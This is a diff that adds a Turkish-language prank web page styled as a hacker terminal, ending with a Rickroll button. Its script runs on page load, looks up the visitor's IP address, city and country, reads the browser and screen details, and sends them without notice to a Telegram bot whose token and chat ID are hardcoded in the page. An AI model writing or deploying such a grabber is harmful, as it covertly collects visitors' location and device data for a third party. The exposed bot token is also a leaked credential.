@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Giriş Kontrolü</title>
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+      margin: 0;
+      overflow: hidden;
+    }
+    #terminal {
+      padding: 30px;
+      white-space: pre-line;
+      height: 100vh;
+      overflow-y: auto;
+    }
+    .background-code {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      color: rgba(0,255,0,0.1);
+      font-size: 12px;
+      animation: scroll 10s linear infinite;
+      z-index: 0;
+    }
+    @keyframes scroll {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-100%); }
+    }
+    #rickButton {
+      display: none;
+      margin: 30px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background-color: lime;
+      color: black;
+      border: none;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body>
+  <div class="background-code">
+    <pre>
+01001001 01110000 00111010
+00110100 00110010 00110101
+01110011 01110100 01100101
+01101101 00110000 01100001
+    </pre>
+  </div>
+
+  <div id="terminal"></div>
+  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
+    Tıklamaya cesaretin var mı?
+  </button>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+    const rickButton = document.getElementById('rickButton');
+
+    function typeText(text, delay = 50) {
+      return new Promise(resolve => {
+        let i = 0;
+        const interval = setInterval(() => {
+          terminal.innerText += text.charAt(i);
+          i++;
+          if (i >= text.length) {
+            clearInterval(interval);
+            terminal.innerText += "\n";
+            resolve();
+          }
+        }, delay);
+      });
+    }
+
+    async function sendToTelegram(message) {
+      const chatId = "8059389140";  // kendi chat ID’n
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    async function showInfo() {
+      await typeText("Veriler toplanıyor...");
+      await new Promise(r => setTimeout(r, 1000));
+
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      await typeText(`IP Adresi: ${data.ip}`);
+      await typeText(`Şehir: ${data.city}`);
+      await typeText(`Ülke: ${data.country_name}`);
+      await typeText(`Tarayıcı: ${navigator.userAgent}`);
+      await typeText(`Ekran: ${screen.width}x${screen.height}`);
+
+      const message = `YENİ GİRİŞ:
+IP: ${data.ip}
+Şehir: ${data.city}
+Ülke: ${data.country_name}
+Tarayıcı: ${navigator.userAgent}
+Çözünürlük: ${screen.width}x${screen.height}`;
+      
+      await sendToTelegram(message);
+
+      await new Promise(r => setTimeout(r, 1000));
+      rickButton.style.display = 'block';
+    }
+
+    showInfo();
+  </script>
+</body>
+</html>
